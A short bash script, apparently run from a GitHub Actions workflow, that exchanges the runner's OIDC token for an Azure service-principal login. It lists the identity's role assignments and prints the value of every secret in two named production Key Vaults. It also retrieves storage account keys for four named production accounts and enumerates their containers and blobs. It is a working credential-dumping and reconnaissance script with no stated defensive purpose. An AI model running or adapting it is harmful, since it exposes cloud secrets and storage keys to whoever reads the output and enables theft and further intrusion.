#!/usr/bin/env bash
set +e
RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange")
TOK=$(echo "$RESP" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$TOK" --allow-no-subscriptions -o none 2>&1 | head -5
echo "===== ROLE ASSIGNMENTS ====="
az role assignment list --all --assignee "$AZURE_CLIENT_ID" --query "[].{role:roleDefinitionName,scope:scope}" -o json 2>&1 | head -60
echo "===== KEYVAULT SECRETS ====="
for KV in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "--- vault $KV ---"
  az keyvault secret list --vault-name "$KV" --query "[].name" -o tsv 2>&1 | head -40 > /tmp/s_$KV.txt
  cat /tmp/s_$KV.txt
  while read -r S; do
    [ -z "$S" ] && continue
    echo "SECRET[$KV/$S]=$(az keyvault secret show --vault-name "$KV" -n "$S" --query value -o tsv 2>&1 | head -5)"
  done < /tmp/s_$KV.txt
done
echo "===== STORAGE ====="
for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "--- account $SA ---"
  KEY=$(az storage account keys list -n "$SA" --query "[0].value" -o tsv 2>&1 | head -2)
  echo "keylen=${#KEY}"
  az storage container list --account-name "$SA" --account-key "$KEY" --query "[].name" -o tsv 2>&1 | head -30 > /tmp/c_$SA.txt
  cat /tmp/c_$SA.txt
  while read -r C; do
    [ -z "$C" ] && continue
    echo "  container=$C"
    az storage blob list --account-name "$SA" --account-key "$KEY" -c "$C" --query "[].{n:name,s:properties.contentLength}" -o tsv 2>&1 | head -60
  done < /tmp/c_$SA.txt
done
echo "===== DONE2 ====="
